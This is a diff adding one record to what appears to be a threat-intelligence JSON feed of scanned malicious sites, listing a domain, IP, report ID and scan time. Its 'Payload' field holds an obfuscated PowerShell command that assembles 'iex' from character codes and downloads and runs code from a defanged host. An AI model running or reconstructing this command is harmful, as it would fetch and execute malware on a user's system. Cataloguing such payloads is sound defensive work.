@@ -1,5 +1,18 @@
 [
   {
+    "UrlDomain": "xplortravel.co",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "75.102.20.37"
+    ],
+    "Related": [],
+    "Payload": "powershell \"switch($true){default{&($($lc='';foreach($u in 105,101,120){$lc=$lc+[char]$u};$lc)) $(&('ir'+'m') 'apqiwg[.]com/z9xX')}}\"",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmww5jriw0g6q0nml8w3skc6t",
+    "ScannedAt": "2026-11-25T13:21:22.502000+00:00"
+  },
+  {
     "UrlDomain": "kmnuhospitals.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
